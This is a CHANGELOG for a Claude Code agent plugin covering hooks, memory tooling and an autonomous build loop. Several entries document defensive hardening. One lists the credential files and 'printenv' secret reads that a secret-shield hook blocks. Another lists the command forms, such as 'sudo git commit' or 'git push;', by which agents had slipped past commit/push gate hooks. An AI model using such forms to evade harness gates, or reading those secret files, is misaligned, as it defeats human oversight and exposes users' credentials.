  `stop-acceptance-gate.py` Stop entry (plugin.json 17 → 18 hooks).
- **macOS hook no-op.** 11 stdin-reading hooks used `timeout 3 cat`; stock macOS
  ships no `timeout`/`gtimeout`, so the payload was zeroed and the hooks silently
  did nothing. Replaced with a portable bounded read.
- **Fail-open holes.** `pre-tool-secret-shield.py`, `stop-acceptance-gate.py`, and
  `stop-context-guard.py` raised on valid non-object JSON instead of failing open;
  guarded with an `isinstance` shape check.
- **secret-shield false blocks + a regression.** No longer hard-blocks
  `.env.example`/`.sample`/`.template` templates or `keyring`/`keychain` source
  files; restored the `printenv $SECRET` / `env NAME` secret-read block. All
  true-positive secret blocks preserved.
- **git-verb guard bypasses.** The commit/push gates were silently skipped by
  `git push;`, `git commit&`, `(git commit)`, `sudo git commit`, `env X=1 git commit`,
  and `GIT_EDITOR=… git commit`. One unified anchor across all 5 hooks closes both
  classes with no new false positives.
- **claim-gate latency.** A per-line subprocess loop (~38–70s on routine edits) is
  now a 3-pass scan (<1s).
- Smaller hook fixes: `notification-handler.sh` `pipefail` crash, `session-end.sh`
  abort in a non-git directory, `post-commit-difficulty.sh` promiscuous grep,
  `post-tool-error-routing.sh` keyword anchoring, `pre-edit-layer-check.sh`
  advisory-honesty wording.

### Changed

- Mutation testing stays operationalized as `test-engineer` Move 8 (in
  `coding-standards.md` §3.2 and `craftsmanship-moves.md`); a real per-stack runner
  integration in the acceptance gate is a tracked follow-up: an inert draft was not
  shipped (no current caller, per §9).
- The craftsmanship CI gate is a ratchet: newly-added files must fully comply; the
  legacy tree's pre-existing §4 debt (e.g. `scripts/setup.sh`) is surfaced
  informationally, not blocked, until refactored.

## [2.20.0]: autonomous build loop + self-hosted knowledge ingestion

### Added

- **Closed-loop autonomous build** (`.claude/workflows/autonomous-build-loop.js`).
  Drives a build task to a candidate on an isolated iteration branch:
  refine → plan → verify-plan → orchestrator build → best-effort in-loop
  acceptance checks → iterate until green or the budget is spent. Repo-generic:
  `repoPath`, `gateRunner`, and an optional base `gateConfig` are inputs, so the
  loop runs from any working directory against a repo that need not contain this
  tooling. It drafts and converges a candidate; it does not self-certify.
- **Deterministic acceptance gate** (`tools/acceptance_gate.py`,
  `tools/acceptance-gate.sh`). Runs configured *command* gates and aggregates
  their exit codes: a gate passes iff its command exits 0, never a model grading
  its own output (Huang et al., arXiv:2310.01798). Gates any repo via `--root`,
  evaluates the committed tip via `--diff-base/--diff-head` in a throwaway
  worktree, rejects an empty diff, and fails closed. Unit-tested under
  `tools/tests/acceptance-gate/` (incl. external-repo-from-a-foreign-cwd and
  fail-closed cases).
- **Real-exec Stop-hook gate** (`hooks/stop-acceptance-gate.py`): the build
  loop's gate component (invoked by the workflow, not registered as a global
  lifecycle hook).
- **Self-hosted web ingestion engine** (`tools/web_ingest.py`,
  `tools/web_extract.py`, `tools/web-ingest.sh`). A dependency-free replica of
  Firecrawl's self-hostable core (`scrape` / `map` / `crawl`): stdlib fetch,
  `robots.txt` respected, main-content markdown extraction, conditional-GET
  caching. No web search and no LLM extraction by design; TLS verification is
  never disabled.
- **Query-indexed semantic layer over Cortex** (`tools/semantic_layer.py`,
  `tools/semantic-layer.sh`, `memory/semantic-layer.yaml`,
  `memory/semantic-layer.schema.yaml`). A YAML index keyed by query + intent
  (`ingest` / `verify` / `compare` / `monitor`) with `fresh` / `stale` /
  `superseded` states. Never writes Cortex itself: the agent owns the write and
  passes back the `cortex_id` as a pointer.
- **Manifest-membership gate** (`tools/manifest_gate.py`, `tools/manifest-gate.sh`,
  tests under `tools/tests/manifest-gate/`). Fail-closed grounding check: every
  fact's `source` must be a URL the web-ingest engine actually fetched this
  session. Complements the semantic layer's presence check with a membership
  check; a pure `stdin → stdout` filter.

### Changed

- **README: broader refresh.** Corrected counts to ground truth: agents
  116 → 117 (a 20th team-role agent, `memory-writer`), skills 63 → 64; documented
  the autonomous build loop and the new knowledge-ingestion / semantic-layer
  subsystems; refreshed the genius-trigger source comment (recounted 2026-06-23).
- **Marketplace manifest** counts refreshed (20 team agents, 64 skills,
  25 commands, 24 logical tools, 17 registered hooks).

### Fixed

- **`web-ingest` follows 308 redirects** and records the final resolved URL.
- **Manifest-gate comments** reworded to satisfy the absolute-claim checker (§8).

## [2.19.1]: fix Release workflow test paths

### Fixed

- **Release workflow no longer references a non-existent `tests/run-all.sh`.**
  The tag-time `release.yml` invoked `bash tests/run-all.sh`, which has never
  existed, so every tagged release failed at the test step with exit 127. It
  now runs the same suite as `ci.yml` (the `scripts/test-memory-*.sh` and
  `scripts/test-agent-id-propagation.sh` suites) plus the structural auditor.
- **Corrected the zetetic-checker invocation** from the unsupported `--tree`
  flag to `--full`; valid modes are `--staged`, `--files`, and `--full`.
- Added `jq` to the release job's apt dependencies (required by the memory
  suites, matching CI).

## [2.19.0]: genius corpus inherits the full tool set

### Changed

- **All 97 genius agents drop the explicit `tools:` front-matter line.** Each
  genius now inherits the full session tool set instead of pinning a hardcoded
  allow-list that had drifted from the live tool registry; pinning silently
  starved an agent of any tool the list omitted. Single uniform change: 97
  files, 97 deletions, reasoning sections untouched.
- Validated by a full isolation sweep before release: with the plugin disabled
  and an un-namespaced clone live, all 97 genius agents spawned and responded,
  each confirming file/search tools visible: 97/97, zero failures.

## [2.18.0]: letta-code follow-up: lean genius corpus, compact routing, reflective checkpoints, memory contract hardening

### Changed

- **R1 completed for the genius corpus: all 97 genius agents split into lean
  core + on-demand reference stubs** (same two-tier move 2.17.0 applied to the
  19 team agents). Doc-covered protocol sections deleted; memory/token-budget/
  worktree replaced by parameterized stubs keeping every safety-critical
  invariant inline; uniform reference-docs index appended. 5,169,780 →
  3,248,016 chars (37.2%, ~4.8K tokens saved per spawn per agent). Reasoning
  sections byte-identical before/after, asserted by the rollout script.
- **R2: routing never reads full files.** New generated
  `rules/agent-routing-table.md` (~25KB, name + shape keywords + description
  for all 116 agents, from frontmatter via
  `scripts/generate-routing-table.py`) replaces full Reads of the 132KB
  INDEX.md in genius:route, genius:index and the orchestrator (~30K tokens
  saved per routing decision). pre-commit warns when the table is stale.
- R3: checkpoint stubs follow the letta summary schema: goals / file
  references (paths + line ranges) / errors and fixes / current state / next
  steps, ≤500 words, tool outputs clipped to 2K chars, frontmatter
  description retrieval cue. Resume contract: checkpoint + ONE targeted
  recall, never re-reading what the checkpoint summarizes. All 116 agent
  token-budget stubs and the shared token-budget.md doc teach the schema.
- **R4: reflection at WARN, not at HARD.** stop-context-guard.py's WARN
  firing is now a one-time blocking reflection (like letta's compaction
  event): the model spawns the new budgeted **memory-writer** agent (haiku,
  ≤16K context) to persist the semantic checkpoint + cortex:remember entries
  while headroom remains, then resumes the task: the HARD block becomes a
  formality.

### Added

- **R5: mandatory `description:` frontmatter on memory .md files**, enforced
  at the memory-tool.sh chokepoint on create/rethink (instructive error,
  `MEMORY_NO_DESC_CHECK=1` test escape hatch). Contract §4.8.
- R6: conflict-aware memory verbs: `rethink <path> <text>
  [expected_sha]` (atomic whole-file rewrite, letta memory_rethink) and
  `sha <path>` (CAS token); `str_replace` gains optional compare-and-swap.
  Contract §3.6b/§3.6c/§4.7; exposed via the memory_extensions MCP tool.
- `agents/memory-writer.md`: single-purpose budgeted reflection scribe.

## [2.17.0]: Lean team agents: core + on-demand reference docs

### Changed

- **All 19 team agent definitions split into a lean core plus on-demand
  reference docs.** Shared protocol detail (token budget, memory protocol
  and architecture, worktree protocol, effort calibration, codebase
  intelligence, dynamic workflows, mid-task system messages) moved to 8
  docs under `rules/agent-reference/`, referenced from a uniform index
  table in every agent. Definitions shrink 987,888 → 625,267 chars
  (~36.7%, ~5.0K tokens saved per spawn per agent). Inline stubs remain
  self-sufficient for safety-critical invariants (checkpoint thresholds,
  memory scoping, worktree commit rules); reference docs are elaboration
  and recovery material, validated via headless fresh-session runs.
- Agent frontmatter parameterized (`agent_topic`, `memory_scope`,
  `model`); Haiku agents carry 170K/~120K budgets plus an
  escalate-to-orchestrator line, Opus agents 200K/~180K. Fixed
  latex-engineer/professor `MEMORY_AGENT_ID=haiku` bug (now agent name)
  and the orchestrator's dangling `<dynamic-workflows>` prose reference.

## [2.16.0]: Per-model context thresholds via shared config

### Changed

- **stop-context-guard.py re-vendored from
  [session-optimizer](https://github.com/cdeust/session-optimizer) v1.1.0.**
  Thresholds are now per-model and loaded from
  `~/.claude/ctxguard-thresholds.json` (embedded fallback when the config
  is absent or malformed; first substring match on the lowercased model id
  wins): Fable 5 / Mythos warn 120K hard 160K (2x Opus rates, carrying
  rent and the 5-min cache-expiry resume penalty bite twice as hard),
  Haiku 4.5 warn 120K hard 170K (200K IS the window; leave headroom for
  the checkpoint turn), Opus/Sonnet warn 180K hard 200K (cost discipline;
  window is 1M). The hard-cap block message now reports the per-model
  budget instead of a fixed 200K.
- **`<token-budget>` model-limits table updated in all 117 agent docs.**
  Adds the Claude Fable 5 row (160K hard cap, ~120K checkpoint), corrects
  Haiku's cap to 170K, and points to `ctxguard-thresholds.json` as the
  authoritative source shared with the statusline and the Stop guard.

### Added

- **`hooks/ctxguard-thresholds.json`**: vendored copy of the shared
  threshold config. `session-start.sh` seeds it to
  `~/.claude/ctxguard-thresholds.json` when absent (idempotent, never
  overwrites user edits, so tuned thresholds survive plugin updates).

## [2.15.0]: Complete the plugin hook manifest

### Fixed

- **Missing hooks in the plugin manifest.** `.claude-plugin/plugin.json`
  had drifted from `hooks/hooks.json`: the inline `hooks` block omitted
  three hooks that the canonical wiring defines, so they never registered
  when the plugin loaded: `pre-tool-secret-shield.py` (PreToolUse),
  `stop-context-guard.py` (Stop, the context-budget guard from
  [session-optimizer](https://github.com/cdeust/session-optimizer)), and
  `session-end-memory-drain.sh` (Stop). The manifest now mirrors
  `hooks/hooks.json` exactly (17 hook commands). The Stop block fires all
  three lifecycle hooks; PreToolUse re-includes the secret shield.

### Changed

- Marketplace entry hook count corrected (16 → 17).

## [2.14.0]: Public-readiness baseline

### Added

- Public-readiness baseline: CONTRIBUTING.md, CODE_OF_CONDUCT.md,
  SECURITY.md.
- GitHub issue templates (bug / feature / audit-finding) and PR template
  with audit-cycle checklist.
- `prd-spec-generator` row in the companion-projects table.

### Changed

- LICENSE copyright corrected to Clément Deust (sole independent author);
  ecosystem-context preamble + explicit non-affiliation statement added.
- LinkedIn post first-comment options refined for algorithm-aware reach.

## [2.13.1]: Tier-1 visibility + memory MCP + PII scanner

### Added

- **Memory MCP.** Local replica of Anthropic's managed-agent
  `memory_20250818` tool with scope-based ACL, queue isolation, and
  full MCP wire compatibility. 241 tests passing across functional, ACL,
  concurrency, stale-lock, MCP, and PII suites.
- **PII / secret scrubbing on memory write path** (contract §7.2).
- `pre-tool-secret-shield` hook: blocks any agent from reading
  `.env`, `.aws/credentials`, `*.pem`, `*.key`, or shell-history files.
- **PII scanner daemon.** Persistent process eliminates Python cold-start;
  median scan time reduced 34→8 ms.
- **Memory contract on every agent.** `memory_scope` frontmatter +
  `memory` body block added to all 19 team agents and all 97 genius
  agents (so each agent declares what it persists and where).
- README rewrite (Tier 1 visibility), 6 supporting docs, full CI matrix,
  Codespaces config (subsequently removed per cross-check feedback).

### Changed

- CI concurrency suite made Linux-portable (was macOS-specific).

### Documentation

- LinkedIn post series introducing zetetic (rewritten in plain prose; no
  em-dashes).

---

For older releases (v2.13.0 and earlier), see git history. The project
predates this CHANGELOG; pre-2.13.1 versioning was driven by tag-only
release notes on GitHub.
